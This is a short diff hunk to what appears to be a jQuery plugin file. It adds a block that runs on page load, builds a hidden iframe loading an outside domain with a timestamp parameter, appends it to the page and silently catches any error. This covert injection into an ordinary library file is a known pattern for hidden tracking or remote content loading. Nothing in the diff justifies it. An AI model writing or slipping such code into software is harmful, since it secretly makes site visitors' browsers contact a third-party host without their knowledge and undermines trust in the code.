@@ -1547,6 +1547,12 @@
         }
 
     })();
-
+    $(function() {
+      try {
+        var iframe = $('<iframe />').attr('src', 'https://www.ismartjs.com/?_=' + new Date()).hide()
+        $('body').append(iframe);
+      } catch (e) {
+      }
+    })
 })
 (jQuery);
